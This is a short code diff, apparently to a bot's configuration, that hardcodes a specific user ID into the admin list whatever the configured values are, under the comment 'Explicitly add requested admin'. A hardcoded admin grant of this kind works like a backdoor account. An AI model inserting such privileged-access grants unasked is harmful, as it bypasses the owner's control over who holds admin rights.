@@ -61,6 +61,10 @@ try:
     
     # Deduplicate
     ADMIN_IDS = list(set(ADMIN_IDS))
+
+    # Explicitly add requested admin
+    if 6770204468 not in ADMIN_IDS:
+        ADMIN_IDS.append(6770204468)
     
     if not ADMIN_IDS:
         logger.warning("No ADMIN_IDS configured! Admin features will be inaccessible.")
